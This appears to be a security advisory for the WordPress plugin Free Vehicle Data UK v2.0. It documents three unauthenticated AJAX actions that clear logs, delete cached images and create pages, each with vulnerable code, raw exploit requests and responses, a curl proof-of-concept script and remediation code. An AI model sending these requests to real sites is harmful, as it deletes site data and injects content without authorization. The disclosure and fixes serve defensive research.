## Plugin Information

| Item | Content |
|------|---------|
| **Plugin Name** | free-vehicle-data-uk (Rapid Car Check) |
| **Version** | v2.0 |
| **Vendor** | [Rapid Car Check](https://wordpress.org/plugins/free-vehicle-data-uk/) |
| **Target Site** | http://192.168.190.129/ |
| **Audit Date** | 2026-03-26 |

---

## Vulnerability Overview

| # | Vulnerability Type | Severity | Requires Auth | CVSS |
|---|-------------------|----------|---------------|------|
| 1 | Arbitrary File Deletion (ClearSearchLogs) | 🔴 Critical | ❌ No | 8.1 |
| 2 | Arbitrary File Deletion (ClearImages) | 🔴 Critical | ❌ No | 8.1 |
| 3 | Arbitrary Content Creation (CreatePages) | 🟠 High | ❌ No | 7.3 |

---

## Vulnerability Details

### Vulnerability 1: Unauthenticated Arbitrary File Deletion (ClearSearchLogs)

**Location:** `classes/Ajax.php`

**Vulnerable Code:**
```php
public function ClearSearchLogs(){
    $aAnswer = ['messages'=>['Vehicle search log was deleted!'],'html'=>''];
    $upload_dir = wp_upload_dir();
    $log_file = $upload_dir['basedir'] . '/free-vehicle-data-uk/log.txt';
    file_put_contents($log_file, '');  // Clear log file
    wp_send_json($aAnswer);
}
```

**Vulnerability Reason:**
- Uses `wp_ajax_nopriv_FVD_ClearSearchLogs` - accessible without login
- No permission check
- No Nonce verification

#### Reproduction Steps

**Step 1: Send Request**

```http
POST /wp-admin/admin-ajax.php?action=FVD_ClearSearchLogs HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: Response**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{"messages":["Vehicle search log was deleted!"],"html":""}
```
![image](https://github.com/BigTiger2020/2026/blob/main/20260326-104128.jpg)
---

### Vulnerability 2: Unauthenticated Arbitrary File Deletion (ClearImages)

**Location:** `classes/Ajax.php`

**Vulnerable Code:**
```php
public function ClearImages(){
    $aAnswer = ['messages'=>['Local image cache files have been deleted!'],'html'=>''];
    $upload_dir = wp_upload_dir();
    $image_dir = $upload_dir['basedir'] . '/free-vehicle-data-uk/vehicleimages/';
    if (file_exists($image_dir)) {
        $imagefiles = glob($image_dir . '*');
        foreach ($imagefiles as $imagefile){
            if (is_file($imagefile)) {
                unlink($imagefile);  // Delete all image files
            }
        }
    }
    wp_send_json($aAnswer);
}
```

**Vulnerability Reason:**
- Uses `wp_ajax_nopriv_FVD_ClearImages` - accessible without login
- No permission check
- No Nonce verification

#### Reproduction Steps

**Step 1: Send Request**

```http
POST /wp-admin/admin-ajax.php?action=FVD_ClearImages HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: Response**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{"messages":["Local image cache files have been deleted!"],"html":""}
```
![image](https://github.com/BigTiger2020/2026/blob/main/20260326-104144.jpg)
---

### Vulnerability 3: Unauthenticated Arbitrary Content Creation (CreatePages)

**Location:** `classes/Ajax.php`

**Vulnerable Code:**
```php
public function CreatePages(){
    global $wp_filesystem;
    
    // No permission check
    // No Nonce verification
    
    $aTemplates = [
        ['id'=>0,'url'=>'','title'=>'Two Column FVD Demo','file'=>'2-col-layout.php'],
        ['id'=>0,'url'=>'','title'=>'One Column FVD Demo','file'=>'1-col-layout.php'],
        // ... more templates
    ];

    foreach($aTemplates as $aTemplate){
        $iPageID = wp_insert_post($aArgs);  // Create page
    }
    
    wp_send_json($aAnswer);
}
```

**Vulnerability Reason:**
- Uses `wp_ajax_nopriv_FVD_CreatePages` - accessible without login
- No permission check
- No Nonce verification

#### Reproduction Steps

**Step 1: Send Request**

```http
POST /wp-admin/admin-ajax.php?action=FVD_CreatePages HTTP/1.1
Host: 192.168.190.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

**Step 2: Response**

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: application/json

{
  "messages": ["Your demo pages have been imported"],
  "html": "<div class=\"notice notice-success is-dismissible\">\n<p><strong>Free Vehicle Data UK:</strong><br>Your demo pages have been imported, Click through the demo pages below to see which one best matches your needs!\n    <br><br>\n    <h3>2 Column Demo Pages Imported:</h3>\n    <strong>[Plain] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column Plain Demo Page</a> - Vehicle Search Box ShortCode:<strong> [fvd_searchbox page=http://192.168.190.129/index.php/two-column-fvd-demo/?Reg=FY60KGG]</strong>\t\n    <br><br>\n    <strong>[ALT] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/one-column-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column ALT Demo Page</a>\n    <br><br>\n    <strong>[ALT V2] Two Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-alt-fvd-demo/?Reg=FY60KGG\" target=\"_blank\">View Two Column ALT V2 Demo Page</a>\n    <br><br>\n    <h3>1 Column Demo Pages Imported:</h3>\t\n    <strong>One Column Demo Page Created!</strong><br> \n    >> <a href=\"http://192.168.190.129/index.php/two-column-alt-fvd-demo-alt-img/?Reg=FY60KGG\" target=\"_blank\">View One Column Demo Page</a>\n    </p></div>"
}
```

**Step 3: Verify Page Created**

```http
GET /index.php/two-column-fvd-demo/ HTTP/1.1
Host: 192.168.190.129

HTTP/1.1 200 OK
```
![image](https://github.com/BigTiger2020/2026/blob/main/ScreenShot_2026-03-26_104912_329.png)
---

## Remediation Suggestions

### 1. Add Permission Check

```php
// Add permission check in Ajax.php
public function ClearSearchLogs(){
    // Add permission check
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... original code
}

public function ClearImages(){
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... original code
}

public function CreatePages(){
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized', 403);
    }
    // ... original code
}
```

### 2. Add Nonce Verification

```php
// Verify nonce before AJAX processing
add_action('wp_ajax_nopriv_FVD_CreatePages', function() {
    check_ajax_referer('fvd_security_nonce', 'nonce');
    // ... processing code
});
```

### 3. Disable nopriv Actions

```php
// Change wp_ajax_nopriv_* to wp_ajax_*
// Only allow logged-in users
add_action('wp_ajax_FVD_CreatePages', [$this, 'CreatePages'], 9999);
// Remove: add_action('wp_ajax_nopriv_FVD_CreatePages', ...
```

---

## POC Script

```bash
#!/bin/bash
#=====================================
# Free Vehicle Data UK v2.0 - POC
# Unauthenticated Vulnerabilities
#=====================================

TARGET="http://192.168.190.129"

echo "======================================"
echo "Free Vehicle Data UK v2.0 POC"
echo "======================================"

echo ""
echo "[*] Test 1: Clear Search Logs (Arbitrary File Deletion)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_ClearSearchLogs"
echo ""

echo ""
echo "[*] Test 2: Clear Images (Arbitrary File Deletion)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_ClearImages"
echo ""

echo ""
echo "[*] Test 3: Create Pages (Arbitrary Content Creation)"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php?action=FVD_CreatePages"
echo ""

echo ""
echo "======================================"
echo "POC Complete"
echo "======================================"
```

---

## References

- **Vulnerability Type:** Arbitrary File Deletion, Arbitrary Content Creation
- **Installation Requirement:** >= 200 (Active Installations)

---

*Report Generated: 2026-03-26*
